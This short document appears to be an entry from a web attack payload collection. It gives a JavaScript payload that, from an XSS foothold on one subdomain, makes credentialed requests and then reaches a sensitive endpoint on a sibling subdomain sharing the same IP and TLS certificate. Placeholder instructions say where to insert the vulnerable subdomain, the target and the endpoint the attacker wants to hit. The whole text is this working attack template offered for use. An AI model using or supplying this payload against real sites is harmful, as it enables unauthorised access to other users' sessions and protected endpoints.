payloads_or_patterns:
```javascript
fetch('//<VULNERABLE_SUBDOMAIN>/', {mode: 'no-cors', credentials: 'include'}).then(()=>{
  fetch('//<TARGET_SUBDOMAIN>/<SENSITIVE_ENDPOINT>', {method: 'GET', headers: {'X-My-Custom-Header': 'Value'}});
});
```

Replace `<VULNERABLE_SUBDOMAIN>` with a subdomain where XSS can be triggered and `<TARGET_SUBDOMAIN>` with a different subdomain sharing the same IP and TLS certificate. `<SENSITIVE_ENDPOINT>` should be an endpoint on the target subdomain that the attacker wishes to interact with.

